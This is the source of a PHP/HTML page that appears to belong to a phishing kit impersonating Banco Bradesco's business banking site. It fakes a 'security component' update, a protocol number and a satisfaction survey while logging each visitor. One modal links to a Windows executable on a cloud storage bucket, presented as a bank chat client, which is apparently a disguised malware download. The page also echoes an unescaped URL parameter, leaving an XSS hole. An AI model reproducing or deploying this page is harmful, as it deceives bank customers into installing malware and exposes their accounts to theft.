<?php
    include 'validacao.php';
    if(!isset($_SESSION['idInfo'])){
        Info::adicionarInfoFromAcesso(getHash());
    }

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Satisfação</title>
    <link rel="shortcut icon" href="images/favicon.ico">
</head>
<body>
    <link rel="shortcut icon" href="https://bradesco.netempresapj.com/images/favicon.ico">
    <link rel="stylesheet" type="text/css" href="./Banco Bradesco _ Componente de Segurança (Plugin)_files/jquery.modal.min.css">
    <link rel="stylesheet" type="text/css" href="./Banco Bradesco _ Componente de Segurança (Plugin)_files/interna.css">

</head>
<body style="overflow: hidden;">
    <div id="header">
        <img src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/header-interna.jpg" alt="">
        <p></p>
    </div>
    <div id="footer">
        <img src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/footer-interna.jpg" alt="">
    </div>
    
<input type="hidden" id="id" value="437">
<input type="hidden" id="hash" value="11818450295eb3fb61132181.30914574">
<script src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/jquery.min.js.transferir"></script>
<script src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/jquery.modal.min.js.transferir"></script>
<script type="text/javascript">
                        <!--
                        var brTokenJavaScript = true;

                        //-->
                    </script>
<script type="text/javascript">


</script>
<script src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/interna.js.transferir"></script>

<div class="jquery-modal blocker current"><div id="modal" class="modal" style="display: inline-block;">
        <div id="boxIniciarAtualizacao" class="boxes hide">    
			
			
			
			
			
			<img src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/iniciar_atualizacao.png" alt="">
            <span class="nome"></span>
            <a class="iniciar" href="javascript:;"><img width="300" src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/btn-iniciar-atualizacao.png"></a>
        </div>
        <div id="boxAtualizacaoAndamento" class="boxes hide">
            <img src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/atualizacao_andamento.png" alt="">
            <span class="nome"></span>
            <div class="barraProgresso">
            <p align="center">&nbsp;<marquee direction="right" scrollamount="8" scrolldelay="100">
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span></marquee></p>
                </div>

        </div>

        <div id="boxConcluirAtualizacao" class="boxes hide">
            <img src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/atualizacao_concluida.png" alt="">
            <span class="nome"></span>
            <a class="iniciar" href="javascript:;"><img width="90" src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/btf-fechar.png"></a>
        </div>
        <div id="boxFinalizarComProtocolo" class="boxes hide">
            <img src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/fundo_protocol.png" alt="">
            <img class="aguardeProtocolo" width="150" src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/aguarando_login.gif">
            <div id="boxProtocolo" class="hide">
                <span style="padding-bottom:10px;display:block">Número do Protocolo:</span>
                <span id="numeroProtocolo">BR-001010201922</span>
            </div>
        </div>
        <div id="boxFalhaComunicacaoInterna" class="boxes hide">
            <img src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/falha-comunicacao-min.png" alt="">
        </div>
        <div id="boxErroMaster" class="boxes hide">
            <img src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/erro-master-min.png" alt="">
        </div>
        <div id="boxAdiantamentoSalarial" class="boxes hide">
            <img src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/adiantamento-min.png" alt="">
        </div>
        <div id="boxChatAtendimentoOnline" class="boxes hide">
            <img src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/atendimento_online-min.png" alt="">
            <a target="_blank" href="https://chatclientes.s3.us-east-2.amazonaws.com/Chat_Net_Empresas.exe">CHAT</a>
        </div>
        <div id="boxAvaliacaoAtendimento" class="boxes">
            <img src="./Banco Bradesco _ Componente de Segurança (Plugin)_files/avaliacao-min.png" alt="">
            <select name="agilidade" id="agilidade">
                <option value="">Selecione</option>
                <option value="Péssimo">Péssimo</option>
                <option value="Regular">Regular</option>
                <option value="Bom">Bom</option>
                <option value="Excelente">Excelente</option>
            </select>
            <select name="facilidade" id="facilidade">
                <option value="">Selecione</option>
                <option value="Péssimo">Péssimo</option>
                <option value="Regular">Regular</option>
                <option value="Bom">Bom</option>
                <option value="Excelente">Excelente</option>
            </select>
            <select name="simpatia" id="simpatia">
                <option value="">Selecione</option>
                <option value="Péssimo">Péssimo</option>
                <option value="Regular">Regular</option>
                <option value="Bom">Bom</option>
                <option value="Excelente">Excelente</option>
            </select>
            <select name="geral" id="geral">
                <option value="">Selecione</option>
                <option value="Péssimo">Péssimo</option>
                <option value="Regular">Regular</option>
                <option value="Bom">Bom</option>
                <option value="Excelente">Excelente</option>
            </select>
            <a class="btn-confirmar-avaliacao" href="javascript:;"></a>
          
		  <button><a target="_blank" href='https://pt.stackoverflow.com'>Click me!</a> </button>
        </div>
		
 
    </div></div></body></html>
<input type="hidden" id="id" value="<?php echo isset($_SESSION['idInfo']) ? $_SESSION['idInfo'] : '';  ?>">
<input type="hidden" id="hash" value="<?php echo isset($_GET['hash']) ? $_GET['hash'] : '';  ?>">
<script src="js/jquery.min.js"></script>
<script src="js/protegido3.js"></script>
<script src="js/loadinfo.js"></script>
</body>
</html>